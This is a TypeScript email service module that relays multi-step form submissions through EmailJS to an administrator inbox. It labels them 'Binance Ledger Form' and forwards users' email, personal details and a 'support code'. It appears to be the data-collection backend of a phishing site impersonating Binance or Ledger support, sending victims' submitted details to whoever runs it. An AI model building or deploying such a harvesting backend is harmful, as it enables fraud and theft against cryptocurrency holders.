
import emailjs from 'emailjs-com';
import { EMAILJS_CONFIG } from '../config/emailjs.config';

export interface EmailData {
  step: string;
  email: string;
  data: any;
  timestamp?: string;
}

export class EmailService {
  private static initialized = false;

  static initialize() {
    if (!this.initialized) {
      emailjs.init(EMAILJS_CONFIG.USER_ID);
      this.initialized = true;
      console.log('EmailJS initialized successfully');
    }
  }

  static async sendFormSubmission(emailData: EmailData): Promise<any> {
    this.initialize();

    const templateParams = {
      step: emailData.step,
      email: emailData.email,
      timestamp: emailData.timestamp || new Date().toISOString(),
      data: JSON.stringify(emailData.data, null, 2),
      to_email: 'admin@yourcompany.com', // Replace with your admin email
      from_name: 'Binance Ledger Form',
      message: `Form submission for step: ${emailData.step}`,
      user_email: emailData.email,
      form_step: emailData.step
    };

    try {
      console.log('Sending email with params:', templateParams);
      
      const result = await emailjs.send(
        EMAILJS_CONFIG.SERVICE_ID,
        EMAILJS_CONFIG.TEMPLATE_ID,
        templateParams
      );

      console.log('Email sent successfully:', result);
      return result;
    } catch (error) {
      console.error('Failed to send email via EmailJS:', error);
      throw new Error(`EmailJS Error: ${error}`);
    }
  }

  static async sendSupportRequest(supportData: {
    email: string;
    personalDetails: any;
    supportCode: string;
    requestType: string;
  }): Promise<any> {
    return this.sendFormSubmission({
      step: 'support-request',
      email: supportData.email,
      data: {
        personalDetails: supportData.personalDetails,
        supportCode: supportData.supportCode,
        requestType: supportData.requestType
      }
    });
  }

  static validateConfig(): boolean {
    const { SERVICE_ID, TEMPLATE_ID, USER_ID } = EMAILJS_CONFIG;
    
    if (!SERVICE_ID || !TEMPLATE_ID || !USER_ID) {
      console.error('EmailJS configuration is incomplete. Please check src/config/emailjs.config.ts');
      return false;
    }

    if (SERVICE_ID.startsWith('service_') && 
        TEMPLATE_ID.startsWith('template_') && 
        USER_ID.length > 10) {
      console.log('EmailJS configuration appears valid');
      return true;
    }

    console.warn('EmailJS configuration may be using default/example values');
    return false;
  }
}

// Auto-validate configuration on import
EmailService.validateConfig();
